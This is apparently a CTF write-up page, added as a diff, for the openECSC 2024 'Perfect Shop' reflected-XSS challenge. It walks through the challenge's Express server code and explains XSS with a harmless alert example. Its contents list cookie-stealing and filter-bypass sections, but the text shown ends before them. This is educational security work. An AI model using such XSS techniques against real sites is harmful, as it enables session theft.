+                    <a href="#productid" aria-label="/product/:id">/product/:id</a></li>
+                <li>
+                    <a href="#search" aria-label="/search">/search</a></li>
+                <li>
+                    <a href="#admin" aria-label="/admin">/admin</a></li>
+                <li>
+                    <a href="#adminid" aria-label="/admin/:id">/admin/:id</a></li>
+                <li>
+                    <a href="#get" aria-label="GET">GET</a></li>
+                <li>
+                    <a href="#post" aria-label="POST">POST</a></li>
+                <li>
+                    <a href="#report" aria-label="Report">Report</a><ul>
+                        
+                <li>
+                    <a href="#get-1" aria-label="GET">GET</a></li>
+                <li>
+                    <a href="#post-1" aria-label="POST">POST</a></li>
+                <li>
+                    <a href="#headless-bot-verification" aria-label="Headless Bot Verification">Headless Bot Verification</a></li></ul>
+                </li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#setup" aria-label="Setup">Setup</a><ul>
+                        
+                <li>
+                    <a href="#docker" aria-label="Docker">Docker</a></li>
+                <li>
+                    <a href="#docker-compose" aria-label="Docker Compose">Docker Compose</a></li>
+                <li>
+                    <a href="#this-challenge" aria-label="This Challenge">This Challenge</a><ul>
+                        
+                <li>
+                    <a href="#linux" aria-label="Linux">Linux</a></li>
+                <li>
+                    <a href="#windows" aria-label="Windows">Windows</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#how-to-attack" aria-label="How to Attack?">How to Attack?</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#parsing" aria-label="Parsing">Parsing</a></li>
+                <li>
+                    <a href="#endpoint-inheritance-its-not-a-real-thing-dont-look-it-up" aria-label="Endpoint inheritance???? (It&rsquo;s not a real thing don&rsquo;t look it up)">Endpoint inheritance???? (It&rsquo;s not a real thing don&rsquo;t look it up)</a></li>
+                <li>
+                    <a href="#traveling-bot" aria-label="Traveling Bot">Traveling Bot</a></li></ul>
+                    
+                <li>
+                    <a href="#studying-the-target-by-playing-around" aria-label="Studying the target by playing around">Studying the target by playing around</a><ul>
+                        
+                <li>
+                    <a href="#first-step-reflected-xss-without-filters" aria-label="First step: Reflected XSS without filters">First step: Reflected XSS without filters</a><ul>
+                        
+                <li>
+                    <a href="#cookie-stealing-and-webhooks" aria-label="Cookie stealing and webhooks">Cookie stealing and webhooks</a></li></ul>
+                </li>
+                <li>
+                    <a href="#second-step-cookie-stealing-on-the-bot" aria-label="Second step: Cookie stealing on the bot">Second step: Cookie stealing on the bot</a></li>
+                <li>
+                    <a href="#third-step-cookie-stealing-on-the-bot-with-the-sanitizer-active" aria-label="Third step: Cookie stealing on the bot with the sanitizer active">Third step: Cookie stealing on the bot with the sanitizer active</a></li>
+                <li>
+                    <a href="#last-step-length-filter-bypass" aria-label="Last Step: Length Filter Bypass">Last Step: Length Filter Bypass</a><ul>
+                        
+                <li>
+                    <a href="#what-i-tried-during-the-competition" aria-label="What I Tried During the Competition">What I Tried During the Competition</a></li></ul>
+                </li>
+                <li>
+                    <a href="#xss-rfi" aria-label="XSS RFI">XSS RFI</a></li>
+                <li>
+                    <a href="#how-to-expose-your-server-to-the-world" aria-label="How to expose your server to the world">How to expose your server to the world</a></li></ul>
+                </li>
+                <li>
+                    <a href="#final-payload" aria-label="Final Payload">Final Payload</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="perfect-shop">Perfect Shop<a hidden class="anchor" aria-hidden="true" href="#perfect-shop">#</a></h1>
+<p><em>March 2024 - filtered and size-limited reflected XSS</em></p>
+<blockquote>
+<p>&ldquo;Do you like perfect things? Check out my new online shop!&rdquo;</p>
+</blockquote>
+<p><em>Prior knowledge: HTML, JavaScript</em></p>
+<h2 id="context">Context<a hidden class="anchor" aria-hidden="true" href="#context">#</a></h2>
+<p>The link to the challenge website and its corresponding source code are provided. At first glance, the website may seem a bit overwhelming: there are various functionalities, which means several endpoints and mechanisms to study in search of vulnerabilities.</p>
+<p>However, fortunately, the code is relatively short and not very verbose, and all files except for <code>server.js</code> do not contain interesting elements: <code>products.js</code> gathers information about the products, while the various <a href="https://en.wikipedia.org/wiki/Template_processor">templates</a> seem to only display elements passed by the server. Their presence can be kept in mind, but the existence of a <a href="https://portswigger.net/web-security/server-side-template-injection">Server Side Template Injection</a> is temporarily ruled out.</p>
+<p>Even before the declaration of the endpoints, you can see the following code at the beginning of <code>server.js</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sanitizer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;perfect-express-sanitizer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">products</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./products&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">HEADLESS_HOST</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">HEADLESS_HOST</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;headless:5000&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">HEADLESS_AUTH</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">HEADLESS_AUTH</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;supersecret&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">WEB_DOM</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">WEB_DOM</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;web:3000&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;openECSC{this_is_a_fake_flag}&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">admin_password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">20</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">sanitizer</span>.<span style="color:#a6e22e">clean</span>({ <span style="color:#a6e22e">xss</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }, [<span style="color:#e6db74">&#34;/admin&#34;</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">errormsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">successmsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>It&rsquo;s already possible to notice something interesting. The first half of the code does nothing but <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">import libraries</a>.</p>
+<h4 id="key-concepts-for-this-challenge">Key Concepts for This Challenge<a hidden class="anchor" aria-hidden="true" href="#key-concepts-for-this-challenge">#</a></h4>
+<p>I&rsquo;ve decided to write down the key concepts necessary to solve the challenge so that the writeup can reach players who are not accustomed to the CTF context, given the nature of the competition. A CTF player and/or a programmer can directly read the <a href="/posts/writeups/openecsc-2024/perfect_shop/#summary-of-available-information">summary of available information</a> or a previous subsection that interests them.</p>
+<h5 id="sending-information-to-the-server">Sending Information to the Server<a hidden class="anchor" aria-hidden="true" href="#sending-information-to-the-server">#</a></h5>
+<p>Starting from <code>const app = express();</code>, which confirms the use of <a href="https://github.com/expressjs/express">express</a> as the <a href="https://en.wikipedia.org/wiki/Web_framework">web framework</a> of the site, the next line allows the programmer to access the data sent by users in POST requests as <a href="https://swagger.io/docs/specification/2-0/describing-request-body/">body parameters</a> through <code>req.body.[parameter]</code>.</p>
+<p><em>Body parameters</em> are the information that the website receives without passing through either <a href="https://www.branch.io/glossary/query-parameters/">query parameters</a> (in <code>https://www.google.com/search?q=openECSC</code>, <code>q</code> is the query parameter and <code>openECSC</code> is its value), or through <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">headers</a> including <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cookie">cookies</a>. Typically, body parameters &ldquo;pass&rdquo; the information that the user enters in a form to the server, which handles it according to the programmer&rsquo;s intentions.</p>
+<p>Summary:
+<img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/body_params.png" alt="Example of using various methods to send information to the server"  />
+</p>
+<p>As you can see, it&rsquo;s not mandatory for what the user sees and what is sent to the server to be the same. In this case, regarding the product, it&rsquo;s much easier for the server to work with the id rather than the name, which in any case would still uniquely represent the selected product. It&rsquo;s also fair to say that the programmer will access this information through the properties <code>req.body.id</code> and <code>req.body.message</code>.</p>
+<h5 id="basics-of-xss">Basics of XSS<a hidden class="anchor" aria-hidden="true" href="#basics-of-xss">#</a></h5>
+<p>Continuing, it&rsquo;s noticeable that <a href="https://github.com/mde/ejs">ejs</a> is the chosen template engine for this app.</p>
+<p>Moving forward, the application is instructed to use <a href="https://github.com/pariazar/perfect-express-sanitizer">perfect-express-sanitizer</a> to avoid the risk of <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> (Cross-Site Scripting), except for the <code>/admin</code> endpoint. This type of attack is very straightforward: it occurs when a site can be manipulated to allow the execution of JavaScript code not explicitly written by the programmer. The most peculiar example is inserting a tag like this: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. If this tag is inserted in a search page that prints what the user has searched for without any sanitization, the tag will be interpreted and the script executed:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/basicXSSexample.gif" alt="Basic XSS example"  />
+</p>
+<p>This attack is &ldquo;temporary&rdquo;, only valid for the victim request, and it&rsquo;s called <em>reflected XSS</em>. If the payload/attack vector (in this case <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) had been somehow stored by the application, like, for example, in a comment, the attack would have been a <em>stored XSS</em>.</p>
+<h5 id="handling-request-and-response-in-express">Handling Request and Response in Express<a hidden class="anchor" aria-hidden="true" href="#handling-request-and-response-in-express">#</a></h5>
+<p>The last portion of code doesn&rsquo;t show anything interesting. <code>res.locals.errormsg</code> and <code>successmsg</code>, if not null, appear as pop-ups containing useful information for the user (e.g., &ldquo;search too long&rdquo;).</p>
+<p>It might be more useful to focus on the <code>req</code> and <code>res</code> parameters. These two parameters are present in all endpoints, and serve respectively to obtain information from and/or about the newly received request (<code>req</code>), and to &ldquo;assign&rdquo; information to the outgoing response, including those related to the aesthetics of the page.</p>
+<h5 id="summary-of-available-information">Summary of Available Information<a hidden class="anchor" aria-hidden="true" href="#summary-of-available-information">#</a></h5>
+<p>We know that the application sanitizes all inputs from XSS thanks to <code>app.use(sanitizer.clean({ xss: true }, [&quot;/admin&quot;]));</code> except for the <code>/admin</code> endpoint and that express is used as the web engine.</p>
+<h3 id="endpoints">Endpoints<a hidden class="anchor" aria-hidden="true" href="#endpoints">#</a></h3>
+<p>Although the &ldquo;playing field&rdquo; turned out to be less extensive than expected, there are several endpoints to analyze. Therefore, it&rsquo;s important to understand their functionality from the beginning.</p>
+<h4 id="-homepage">/ (homepage)<a hidden class="anchor" aria-hidden="true" href="#-homepage">#</a></h4>
+<p>This is the first screen displayed when entering the site, or when a GET request is made to the <code>/</code> endpoint:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/home.png" alt="Homepage"  />
+</p>
+<p>The related code is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;products&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Nothing interesting here: the template responsible for displaying a list of certain products, as shown in the screenshot, is <a href="https://docs.dataops.live/docs/develop-development-principles/template-rendering/">rendered</a>.</p>
+<p>In particular, <code>res.render()</code> is a function that calls a certain template (first parameter) and passes it some information (second parameter). The template is responsible for displaying the information related to all entities passed as the second parameter in a generally ordered and aesthetically pleasing manner.</p>
+<p>In this case, no filter is applied to the <code>products</code> variable, so all products will be displayed.</p>
+<h4 id="productid">/product/:id<a hidden class="anchor" aria-hidden="true" href="#productid">#</a></h4>
+<p>The two colons preceding <code>id</code> indicate that it is a value that can be arbitrarily chosen by the user. One can imagine that there are various products, and this is a way to allow for a <a href="https://expressjs.com/en/starter/basic-routing.html">route</a> for each of them without explicitly specifying one for each.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/product.png" alt="Product detail page"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/product/:id&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">id</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (isNaN(<span style="color:#a6e22e">id</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">products</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">404</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Not found&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;product&#39;</span>, { <span style="color:#a6e22e">product</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span>[<span style="color:#a6e22e">id</span>] });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Here, the value entered by the user as the id is <a href="https://en.wikipedia.org/wiki/Parsing">parsed</a> as an integer and assigned to the variable with the same name (i.e., ensuring that the value is actually an integer, and when it is not, it is transformed into an integer according to certain criteria).</p>
+<p>If the id is not recognized (the product does not exist), a <code>404</code> &ldquo;not found&rdquo; error is returned; otherwise, a template is rendered that returns a result similar to the one shown in the photo for the chosen product.</p>
+<h4 id="search">/search<a hidden class="anchor" aria-hidden="true" href="#search">#</a></h4>
+<p>A classic search functionality that filters results based on the product name.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/search.png" alt="Example of search functionality"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">q</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">50</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">errormsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Search query is too long&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">products</span>.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">product</span> =&gt; <span style="color:#a6e22e">product</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">toLowerCase</span>()));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;search&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">result</span>, <span style="color:#a6e22e">query</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">query</span> });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>If the search string passed as a <em>query parameter</em> is empty, the <code>query</code> variable is assigned an empty string. This also happens when the search string is too long, exceeding 50 characters.</p>
+<p>Then, a <a href="https://en.wikipedia.org/wiki/Case_sensitivity">case-insensitive</a> filter is applied based on the product name: if the searched string is not found in the product name, then that product is not included among the products to render. As you can see by trying to use the endpoint and by inferring from the rendering line, the query will also be returned as output after performing the search in addition to the found products.</p>
+<p>This would be very useful for a simple reflected XSS, but the length filter and especially the omnipresent sanitization do not allow it. Too bad 😔</p>
+<h4 id="admin">/admin<a hidden class="anchor" aria-hidden="true" href="#admin">#</a></h4>
+<p>An admin panel with a list of all available products.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/admin.png" alt="Admin panel overview"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;admin&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The XSS filter on this route is disabled, yet there are no traces of HTML tags or similar.</p>
+<h4 id="adminid">/admin/:id<a hidden class="anchor" aria-hidden="true" href="#adminid">#</a></h4>
+<h4 id="get">GET<a hidden class="anchor" aria-hidden="true" href="#get">#</a></h4>
+<p>Product editing page, part of the admin panel.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/edit_product.png" alt="Product editing page overview"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/:id&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">id</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (isNaN(<span style="color:#a6e22e">id</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">products</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">404</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Not found&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;edit_product&#39;</span>, { <span style="color:#a6e22e">product</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span>[<span style="color:#a6e22e">id</span>] });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The code is practically identical to that of the search route. It serves to identify the product that the admin wishes to modify.</p>
+<p>Already here we could pose a huge question ;)</p>
+<h4 id="post">POST<a hidden class="anchor" aria-hidden="true" href="#post">#</a></h4>
+<p>Product modification action by the admin.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/admin/:id&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">id</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (isNaN(<span style="color:#a6e22e">id</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">products</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">404</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Not found&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">admin_password</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">errormsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid password&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;edit_product&#39;</span>, { <span style="color:#a6e22e">product</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span>[<span style="color:#a6e22e">id</span>] });
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">name</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">products</span>[<span style="color:#a6e22e">id</span>].<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">description</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">products</span>[<span style="color:#a6e22e">id</span>].<span style="color:#a6e22e">description</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">description</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">price</span> <span style="color:#f92672">=</span> parseFloat(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">price</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>isNaN(<span style="color:#a6e22e">price</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">price</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">products</span>[<span style="color:#a6e22e">id</span>].<span style="color:#a6e22e">price</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">price</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">successmsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Product updated successfully&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;edit_product&#39;</span>, { <span style="color:#a6e22e">product</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span>[<span style="color:#a6e22e">id</span>] });
+</span></span><span style="display:flex;"><span>});
